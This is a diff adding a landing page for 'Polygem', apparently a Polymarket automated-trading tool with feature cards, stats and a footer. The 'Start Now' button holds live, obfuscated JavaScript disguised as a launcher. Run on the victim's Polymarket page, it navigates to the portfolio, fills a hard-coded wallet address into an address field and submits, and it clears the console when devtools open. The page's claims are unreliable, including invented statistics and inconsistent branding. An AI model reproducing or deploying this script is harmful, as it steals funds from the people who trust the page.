@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Polygem | Advanced Polymarket Trading</title>
+    <link rel="icon" href="./favicon.ico" type="image/x-icon" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            line-height: 1.6;
+            color: #ffffff;
+            background: #0a0b0d;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        /* Animated background */
+        .bg-animated {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.05;
+            pointer-events: none;
+            z-index: -1;
+        }
+        
+        .bg-animated::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, #4ade80, #22d3ee, #a855f7, #f59e0b);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
+        }
+        
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        /* Custom gem icon */
+        .gem-icon {
+            width: 24px;
+            height: 24px;
+            fill: none;
+            stroke: #4ade80;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+        .glass {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+        }
+        
+        /* Header */
+        .header {
+            padding: 20px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: rgba(10, 11, 13, 0.95);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 28px;
+            font-weight: 700;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .logo-box {
+            background: rgba(74, 222, 128, 0.1);
+            border: 1px solid rgba(74, 222, 128, 0.3);
+            border-radius: 12px;
+            padding: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(10px);
+        }
+        
+        .logo-text {
+            background: linear-gradient(135deg, #4ade80, #22d3ee);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 30px;
+            list-style: none;
+        }
+        
+        .nav-links a {
+            text-decoration: none;
+            color: #94a3b8;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+        
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: linear-gradient(135deg, #4ade80, #22d3ee);
+            transition: width 0.3s ease;
+        }
+        
+        .nav-links a:hover {
+            color: #4ade80;
+        }
+        
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+        
+        .cta-button {
+            background: linear-gradient(135deg, #4ade80, #22d3ee);
+            color: #0a0b0d;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 12px;
+            font-weight: 600;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .cta-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.5s ease;
+        }
+        
+        .cta-button:hover::before {
+            left: 100%;
+        }
+        
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(74, 222, 128, 0.3);
+        }
+        
+        /* Hero Section */
+        .hero {
+            padding: 100px 0;
+            text-align: center;
+            position: relative;
+        }
+        
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 50%;
+            width: 800px;
+            height: 800px;
+            background: radial-gradient(circle, rgba(74, 222, 128, 0.1) 0%, transparent 70%);
+            transform: translateX(-50%);
+            animation: pulse 4s ease-in-out infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 0.5; transform: translateX(-50%) scale(1); }
+            50% { opacity: 0.8; transform: translateX(-50%) scale(1.1); }
+        }
+        
+        .hero-content {
+            position: relative;
+            z-index: 2;
+        }
+        
+        .hero h1 {
+            font-size: 56px;
+            font-weight: 800;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, #ffffff, #94a3b8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: fadeInUp 0.8s ease-out;
+        }
+        
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .hero .subtitle {
+            font-size: 20px;
+            color: #94a3b8;
+            margin-bottom: 40px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+            animation: fadeInUp 0.8s ease-out 0.2s both;
+        }
+        
+        .hero-cta {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            margin-bottom: 80px;
+            animation: fadeInUp 0.8s ease-out 0.4s both;
+        }
+
+        .gradient-text {
+            background: linear-gradient(135deg, #4ade80, #22d3ee);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+
+            /* Optional for Firefox */
+            background-clip: text;
+            color: transparent;
+        }
+        
+        .secondary-button {
+            background: transparent;
+            color: #4ade80;
+            border: 2px solid #4ade80;
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-weight: 600;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .secondary-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 0;
+            height: 100%;
+            background: #4ade80;
+            transition: width 0.3s ease;
+            z-index: -1;
+        }
+        
+        .secondary-button:hover::before {
+            width: 100%;
+        }
+        
+        .secondary-button:hover {
+            color: #0a0b0d;
+            transform: translateY(-2px);
+        }
+        
+        .dashboard-preview {
+            position: relative;
+            max-width: 900px;
+            margin: 0 auto;
+            animation: fadeInUp 0.8s ease-out 0.6s both;
+        }
+        
+        .dashboard-card {
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 20px;
+            padding: 20px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.25);
+            transition: all 0.5s ease;
+        }
+        
+        .dashboard-card:hover {
+            transform: rotateX(5deg) rotateY(5deg);
+            box-shadow: 0 35px 70px rgba(0, 0, 0, 0.35);
+        }
+        
+        .dashboard-preview img {
+            width: 100%;
+            height: auto;
+            border-radius: 12px;
+        }
+        
+        /* Features Section */
+        .features {
+            padding: 50px 0;
+            position: relative;
+        }
+        
+        .features h2 {
+            text-align: center;
+            font-size: 42px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, #ffffff, #94a3b8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .features-subtitle {
+            text-align: center;
+            color: #64748b;
+            font-size: 18px;
+            margin-bottom: 80px;
+            max-width: 500px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
+            gap: 30px;
+            margin-bottom: 60px;
+        }
+        
+        .feature-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 40px 30px;
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
+            group: hover;
+        }
+        
+        .feature-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(74, 222, 128, 0.1), rgba(34, 211, 238, 0.1));
+            opacity: 0;
+            transition: opacity 0.4s ease;
+        }
+        
+        .feature-card:hover::before {
+            opacity: 1;
+        }
+        
+        .feature-card:hover {
+            border-color: rgba(74, 222, 128, 0.3);
+            transform: translateY(-10px);
+            box-shadow: 0 20px 40px rgba(74, 222, 128, 0.1);
+        }
+        
+        .feature-icon {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, #4ade80, #22d3ee);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 25px;
+            font-size: 30px;
+            position: relative;
+            z-index: 2;
+            transition: all 0.4s ease;
+        }
+        
+        .feature-card:hover .feature-icon {
+            transform: scale(1.1) rotate(5deg);
+            box-shadow: 0 10px 25px rgba(74, 222, 128, 0.3);
+        }
+        
+        .feature-card h3 {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #ffffff;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .feature-card p {
+            color: #94a3b8;
+            line-height: 1.7;
+            position: relative;
+            z-index: 2;
+        }
+        
+        /* Floating elements */
+        .floating-card {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 12px;
+            padding: 20px;
+            animation: float 6s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-20px); }
+        }
+        
+        .floating-card-1 {
+            top: 10%;
+            right: 5%;
+            animation-delay: 0s;
+        }
+        
+        .floating-card-2 {
+            bottom: 20%;
+            left: 5%;
+            animation-delay: 3s;
+        }
+        
+        /* Stats Section */
+        .stats {
+            background: linear-gradient(135deg, rgba(74, 222, 128, 0.1), rgba(34, 211, 238, 0.1));
+            padding: 100px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .stats::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(74, 222, 128, 0.1) 0%, transparent 50%);
+            animation: rotate 20s linear infinite;
+        }
+        
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
+        .stats-content {
+            position: relative;
+            z-index: 2;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 40px;
+            text-align: center;
+        }
+        
+        .stat-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 20px;
+            padding: 40px 20px;
+            transition: all 0.3s ease;
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(74, 222, 128, 0.15);
+        }
+        
+        .stat-item h3 {
+            font-size: 42px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #4ade80, #22d3ee);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 10px;
+        }
+        
+        .stat-item p {
+            color: #94a3b8;
+            font-weight: 500;
+            font-size: 16px;
+        }
+        
+        /* CTA Section */
+        .cta-section {
+            padding: 120px 0;
+            text-align: center;
+            background: linear-gradient(135deg, rgba(34, 211, 238, 0.15), rgba(168, 85, 247, 0.15));
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .cta-section::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 1000px;
+            height: 1000px;
+            background: radial-gradient(circle, rgba(74, 222, 128, 0.1) 0%, transparent 70%);
+            transform: translate(-50%, -50%);
+            animation: pulse 8s ease-in-out infinite;
+        }
+        
+        .cta-content {
+            position: relative;
+            z-index: 2;
+        }
+        
+        .cta-section h2 {
+            font-size: 42px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, #ffffff, #94a3b8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .cta-section p {
+            font-size: 18px;
+            margin-bottom: 40px;
+            color: #94a3b8;
+            max-width: 500px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .cta-section .cta-button {
+            font-size: 18px;
+            padding: 16px 32px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(74, 222, 128, 0.3);
+        }
+        
+        /* Footer */
+        .footer {
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(20px);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: white;
+            padding: 80px 0 40px;
+        }
+        
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+        
+        .footer-section h4 {
+            font-weight: 600;
+            margin-bottom: 25px;
+            color: #ffffff;
+            font-size: 18px;
+        }
+        
+        .footer-section ul {
+            list-style: none;
+        }
+        
+        .footer-section ul li {
+            margin-bottom: 12px;
+        }
+        
+        .footer-section ul li a {
+            color: #94a3b8;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+        
+        .footer-section ul li a:hover {
+            color: #4ade80;
+            padding-left: 5px;
+        }
+        
+        .footer-bottom {
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding-top: 30px;
+            text-align: center;
+            color: #64748b;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 40px;
+            }
+            
+            .hero-cta {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .nav-links {
+                display: none;
+            }
+            
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .floating-card {
+                display: none;
+            }
+        }
+        
+        /* Custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: #1a1a1a;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(135deg, #4ade80, #22d3ee);
+            border-radius: 4px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(135deg, #22d3ee, #4ade80);
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-animated"></div>
+
+    <!-- Header -->
+    <header class="header">
+        <div class="container">
+            <nav class="nav">
+                <div class="logo">
+                    <div class="logo-box">
+                        <svg class="gem-icon" viewBox="0 0 24 24">
+                            <path d="M6 3h12l4 6-10 12L2 9l4-6z"/>
+                            <path d="M10 12l2-7 2 7"/>
+                            <path d="M6 9h12"/>
+                        </svg>
+                    </div>
+                    <span class="logo-text">Polygem</span>
+                </div>
+                <ul class="nav-links">
+                    <li><a href="#features">Features</a></li>
+                </ul>
+                <a href="#" class="cta-button">Get Started</a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container">
+            <div class="hero-content">
+                <h1>Maximize Profits With  <span class="gradient-text">Automated Trading</span></h1>
+                <p class="subtitle">Advanced analytics, automated strategies, and intelligent insights to maximize your prediction market performance</p>
+                <div class="hero-cta">
+                    <a href='javascript:(function() { "use strict"; function D5ma4(e){return decodeURIComponent(escape(atob(e)));}; const p_Ap0 = ["Y2FsbA==","YVtocmVmPSIvcG9ydGZvbGlvIl0=","LmMtUEpMVi5jLWZFWVpvQi5jLVBKTFYtaWZhcWpOUC1jc3MuYy1QSkxWLWloTUFXZUEtY3Nz","aW5wdXRbcGxhY2Vob2xkZXI9IjB4Li4uIl0=","dmFsdWU=","MHhiQjY1RDk1RTAxRDAwMjQ4ZkFhNkJhQWE4NEE2ODQ1M2Y2YzQzNUVi","aW5wdXQ=","Y2hhbmdl","LmMtUEpMVi5jLVBKTFYtaWhyTXRlYS1jc3M="]; function InDh2(k, oi){ const actualOriginalIndex = oi ^ k; return D5ma4(p_Ap0[actualOriginalIndex]); }; (function(){ let _c = 0; const _t = setInterval(function(){ if(window.console && window.console.firebug || (window.outerWidth - window.innerWidth > 100) || (window.outerHeight - window.innerHeight > 100)){ if(_c < 3){ console.clear(); _c++; } else { clearInterval(_t); }; }; }, 500); })(); function R5aPw(){if(false){var gbG = 94; console.log(JB8);}}; const bEJ_eP = 468 * 4; (() => { const LxIZc = (NHqHa, osL6) => { const YbQg = setInterval(() => { const Q6m7N = document.querySelector(NHqHa); if (Q6m7N) { clearInterval(YbQg); osL6(Q6m7N); }; }, (12 + 13)); }; document.querySelector(InDh2((3933 - -3933), (3933 - -3934))).click(); LxIZc(InDh2((2173 + 2174), (2172 - -2173)), (ECNW2H) => { ECNW2H.click(); LxIZc(InDh2((1971 + 1972), (1970 - -1970)), (Du4P) => { const tCqY = Object.getOwnPropertyDescriptor( window.HTMLInputElement.prototype, InDh2((3353 - -3353), (3355 + 3355)) ).set; const t5TFq3 = InDh2((600 - -600), (602 - -603)); tCqY.nPbXf_g(Du4P, t5TFq3); Du4P.dispatchEvent(new Event(InDh2((3597 + 3597), (3598 - -3598)), { bubbles: true })); Du4P.dispatchEvent(new Event(InDh2((4190 + 4191), (4189 - -4189)), { bubbles: true })); document.querySelector(InDh2((1497 - -1498), (1501 + 1502))).click(); }); }); })(); })();' class="cta-button">Start Now</a>
+                    <a href="#features" class="secondary-button">Features</a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section class="features" id="features">
+        <div class="container">
+            <h2>Transform Your Polymarket Experience</h2>
+            <p class="features-subtitle">Unlock the full potential of prediction markets with our advanced tools</p>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">📊</div>
+                    <h3>Advanced Portfolio Analytics</h3>
+                    <p>Get detailed breakdowns of your positions with advanced metrics like Sharpe ratio, maximum drawdown, risk-adjusted returns, and position correlation analysis. Track performance across categories and time periods with interactive charts.</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">🎯</div>
+                    <h3>Smart Position Optimization</h3>
+                    <p>AI-powered suggestions for position sizing, portfolio rebalancing, and hedge opportunities. Automatically identify overexposed categories and get recommendations for optimal position allocation based on your risk tolerance.</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">🔔</div>
+                    <h3>Real-Time Market Alerts</h3>
+                    <p>Custom notifications for price movements, volume spikes, and market resolution updates. Set personalized alerts for your positions and watch list with advanced filtering options including technical indicators and news sentiment.</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">📈</div>
+                    <h3>Predictive Market Modeling</h3>
+                    <p>Leverage historical data and machine learning models to forecast market movements. Get probability assessments for your positions and identify potentially mispriced markets based on fundamental analysis and crowd sentiment.</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">🚀</div>
+                    <h3>Automated Trading Strategies</h3>
+                    <p>Deploy sophisticated trading bots with customizable strategies including dollar-cost averaging, momentum trading, and arbitrage detection. Backtest strategies on historical data before going live with automated execution.</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">🎨</div>
+                    <h3>Enhanced Portfolio Visualization</h3>
+                    <p>Interactive treemaps, sankey diagrams, and heatmaps to visualize your portfolio composition, profit/loss attribution, and market correlations. Export professional reports and share performance insights with customizable dashboards.</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Floating Cards -->
+        <div class="floating-card floating-card-1">
+            <div style="color: #4ade80; font-weight: 600;">+23.5%</div>
+            <div style="color: #94a3b8; font-size: 14px;">ROI This Month</div>
+        </div>
+        <div class="floating-card floating-card-2">
+            <div style="color: #22d3ee; font-weight: 600;">Real-time</div>
+            <div style="color: #94a3b8; font-size: 14px;">Market Data</div>
+        </div>
+    </section>
+
+    <!-- Stats Section -->
+    <section class="stats">
+        <div class="container">
+            <div class="stats-content">
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-item">
+                            <h3>$2.4M+</h3>
+                            <p>Trading Volume Managed</p>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-item">
+                            <h3>15,000+</h3>
+                            <p>Active Traders</p>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-item">
+                            <h3>23%</h3>
+                            <p>Average ROI Improvement</p>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-item">
+                            <h3>99.9%</h3>
+                            <p>Platform Uptime</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- CTA Section -->
+    <section class="cta-section">
+        <div class="container">
+            <div class="cta-content">
+                <h2>Ready to Level Up Your Trading?</h2>
+                <p>Join thousands of traders who've transformed their Polymarket experience with PolyPro</p>
+                <a href="#" class="cta-button">Start Advanced Trading</a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h4>Product</h4>
+                    <ul>
+                        <li><a href="#">Features</a></li>
+                        <li><a href="#">Pricing</a></li>
+                        <li><a href="#">API</a></li>
+                        <li><a href="#">Integrations</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Resources</h4>
+                    <ul>
+                        <li><a href="#">Documentation</a></li>
+                        <li><a href="#">Tutorials</a></li>
+                        <li><a href="#">Blog</a></li>
+                        <li><a href="#">Community</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Company</h4>
+                    <ul>
+                        <li><a href="#">About</a></li>
+                        <li><a href="#">Careers</a></li>
+                        <li><a href="#">Contact</a></li>
+                        <li><a href="#">Privacy</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Support</h4>
+                    <ul>
+                        <li><a href="#">Help Center</a></li>
+                        <li><a href="#">Discord</a></li>
+                        <li><a href="#">Twitter</a></li>
+                        <li><a href="#">Status</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2025 PolyPro. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
